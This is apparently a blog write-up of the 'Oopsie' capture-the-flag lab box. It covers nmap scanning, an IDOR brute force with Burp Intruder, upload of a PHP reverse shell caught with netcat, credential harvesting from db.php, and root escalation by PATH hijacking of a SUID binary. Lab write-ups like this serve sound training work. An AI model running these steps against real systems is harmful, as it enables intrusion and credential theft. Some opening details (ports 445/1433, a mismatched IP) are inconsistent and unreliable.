---
title: "Writeup: Oopsie"
date: 2021-01-01T9:34:30-04:00
categories:
  - Blog
  - Writeup
tags:
  - oopsie
  - update
  - nmap
  - passwords
  - BURP
  - dirsearch
  - webshell
  - cat
  - PATH
  - export
  - strings
  - chmod
  - upgrade shell
  - id
  - su
---

Here are notes from the named target:

*Enumeration* - Ports 445 and 1433 are open, which are associated with file sharing (SMB) and SQL Server.
Linux - 10.10.10.28
```yaml
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 nmap -sC -sV -p$ports 10.10.10.27 
```

Results:
```yaml
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Two Ports open SSH and Web

*Enumerate* the Web port 80 - MegaCorpAutomotive

Using a web browser connect to the IP and look around. None of the menu links work but at the bottom of the home page it speaks about login but no page for that. Use BURP proxy to take a look at web traffic.

**BURP**

Using BURP and its uilt in browser no need to configure external browser.
  open web site and in BURP click :Forward" button on the Proxy tab until the page opens up:
  Switch to the :Target" tab and you see a folder tree under the Web IP for "CDN-CGI\login" add that to url path in browser and hit enter:
  back in BURP on the Proxy Tab click Forward to get to the Login Screen:
  
From the "ARCHTYPE" box we learned that their was an Administrator/Admin account that used the Password: MEGACORP_4dm1n!!

Using that Admin user name and Password from ARCHETYPE works and we get the admin page

```yaml
http://10.10.10.28/cdn-cgi/login/admin.php
```

Look around that page:

  The uploads page says that "super admin" is needed to access but I am logged in as only Admin
  
  ```yaml
  http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads
  ```
  
  Using BURP proxy again turn ON Intercept and capture the account page to get the user ID
  Send the page to intruder:
  
  Clear all the automatic set variables with the Cler button and highlight the id=1 then click add to gt this
  
  ```yaml
  GET /cdn-cgi/login/admin.php?content=accounts&id=§1§ HTTP/1.1

Host: 10.10.10.28

Upgrade-Insecure-Requests: 1
```

Click the Payloads tab and we want to try id=1-100 so we got to list 1-100 numbers in the shell with

```yaml
for i in {1..100}
do
 # your-unix-command-here
 echo $i
done
```

Highlight the numbers 1-100 in the shell - Copy and then in BURP click Paste to add them to the Payloads section:

Click Options and scroll to bottom to the Redections section:
1. click always radio
2. check Process cookies in redirections
  
Click Target Tab and click Start Attack Button: the length field shows that responce text is different than others so taking a look at the ones with different length shows number 30 is "super admin" by choosing it with Response Tb anf RAW selected:

```yaml
<br /><br /><center><h1>Repair Management System</h1><br /><br />
<table><tr><th>Access ID</th><th>Name</th><th>Email</th></tr><tr><td>86575</td><td>super admin</td><td>superadmin@megacorp.com</td></tr></table<script src='/js/jquery.min.js'></script>
<script src='/js/bootstrap.min.js'></script>
</body>
```
  
Use the ID 86575 as the ID value in an uploads page and get access to upload a file.
that gets access to the uploads page

```yaml
http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads
```

Now I wanty to try and upload a PHP reverse shell

**Reverse Shell**
Locate PHP reverse shell from http://pentestmonkey.net/tools/web-shells/php-reverse-shell

Be sure to read what it does and update the IP and port. Save the PHP reverse shell (phpshell.php) and then upload it to the web page:

Now that it is uploaded you have to find out where it was uploaded to so you can browse to it and cause it to fire off:

Use *dirsearch.py*

```yaml
┌──(kali㉿kali)-[~/dirsearch]
└─$ python3 dirsearch.py -e php -u http://10.10.10.28 --exclude-status 403,401                                                                   2 ⨯

  _|. _ _  _  _  _ _|_    v0.4.1                                                                                                                     
 (_||| _) (/_(_|| (_| )                                                                                                                              
                                                                                                                                                     
Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8853

Error Log: /home/kali/dirsearch/logs/errors-20-12-31_12-22-28.log

Target: http://10.10.10.28/                                                                                                                          
                                                                                                                                                     
Output File: /home/kali/dirsearch/reports/10.10.10.28/_20-12-31_12-22-28.txt

[12:22:28] Starting: 
[12:22:40] 301 -  308B  - /css  ->  http://10.10.10.28/css/                                                                             
[12:22:42] 301 -  310B  - /fonts  ->  http://10.10.10.28/fonts/                                       
[12:22:42] 301 -  311B  - /images  ->  http://10.10.10.28/images/  
[12:22:43] 200 -   11KB - /index.php                                                                           
[12:22:43] 200 -   11KB - /index.php/login/
[12:22:43] 301 -  307B  - /js  ->  http://10.10.10.28/js/                                               
[12:22:48] 301 -  311B  - /themes  ->  http://10.10.10.28/themes/                                                 
[12:22:48] 301 -  312B  - /uploads  ->  http://10.10.10.28/uploads/                       
                                                                                                
Task Completed                                   
```
Before we can fire the reverse shell we have to open a listener and have it wait for the connection from the web server reverse shell:

```yaml
nc -nlvp 4321
```
Now we try to browse to the "/uploads/phpshell.php" - you will aslso ne to use the ID of the Super Admin in the BURP Proxy then click "Forward"

**Got SHELL**

```yaml
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4321             
listening on [any] 4321 ...
connect to [10.10.14.87] from (UNKNOWN) [10.10.10.28] 51198
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:38:42 up 11:52,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
```

**UPGRADE SHELL**

If you pop a shell from a web server you are most likely in as "www-data" and the shell is not good to use as a full featured one:

Upgrafe shell with running these commands all at once:

```yaml
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm
```

You may have to answer a question for termanal type so enter "xterm" and/or hit return several times until you get the proper shell:


Grab local info
```yaml
$ cd home
$ ls
robert
$ cd robert
$ ls
user.txt
$ cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
$ whoami
www-data
```

kernal version - Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux:

Check exploit DB - searchsploit
```yaml
┌──(kali㉿kali)-[~]
└─$ searchsploit Linux Kernel 4.15.0
------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                          | solaris/local/15962.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privi | linux/local/9479.c
Linux Kernel 4.10 < 5.1.17 - 'PTRACE_TRACEME' pkexec Local Privilege Escalation                                    | linux/local/47163.c
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (cron Method)                | linux/local/47164.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method)                | linux/local/47165.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload Method)           | linux/local/47166.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method)              | linux/local/47167.sh
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                         | linux/local/41886.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                                                           | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                                               | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                                                     | linux/dos/44579.c
------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Check open ports that may not be visable from outside"

netstat -antup - showm myswl port 3306 listening - that tells me that there may be a SQL server.

Looked to the web server root

```yaml
/var/www/html/cdn-cgi/login
```

see a db.php file and do a cat of that file to see:

```yaml
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

I saw the account "robert" earlier so want to check to see if he is in any groups that can do things so id robert and see he is part of a "bugtracker group" that could mean that there may be an application called bugtracker:
```yaml
id robert
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
Use the locate command to find the bugtracker program but if "locate" does not work you can also use find command

```yaml
# locate bugtracker
locate bugtracker
/usr/bin/bugtracker

# find / -type f -group bugtracker 2>/dev/null       
find / -type f -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```

To run this application change to the robert account with the password found in the sql connection string with his password 'M3g4C0rpUs3r!':

```yaml
root@oopsie:/# su robert
su robert
robert@oopsie:/$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 
```
The bug reports are being read from somewhere so we use the command strings to read out some details from inside the bugtracket program:

```yaml
robert@oopsie:/$ strings /usr/bin/bugtracker
strings /usr/bin/bugtracker
<snip>
AWAVI
AUATL
[]A\A]A^A_
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 
---------------
cat /root/reports/
;*3$"

<snip>
```

It looks like the program calls "cat" to read reports that are in the root folder... therefore cat is running as root in this application.

Put a bogus "cat" in the "/tmp" folder and add "/tmp" to the path will cause our "cat" too be read befor the real one. In this case we are just having "cat open a shell:

```yaml
export PATH=/tmp:$PATH
cd /tmp/
echo '/bin/sh' > cat
chmod +x cat
```

this is the result after we change path to include /tmp and add a bogus cat then run bugtracker again:

```yaml
robert@oopsie:/$ export PATH=/tmp:$PATH
cd /tmp/
echo '/bin/sh' > cat
chmod +x catexport PATH=/tmp:$PATH
robert@oopsie:/$ cd /tmp/
robert@oopsie:/tmp$ echo '/bin/sh' > cat
chmod +x /tmp/cat

robert@oopsie:/tmp$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

# id
id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Now as root we go to root folder and cat the flag file there "root.txt" 
make sure you use the correct version of cat /bin/cat

```yaml
# id
id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
# /bin/cat /root/root.txt
/bin/cat /root/root.txt
af13b0b#################
# 
```


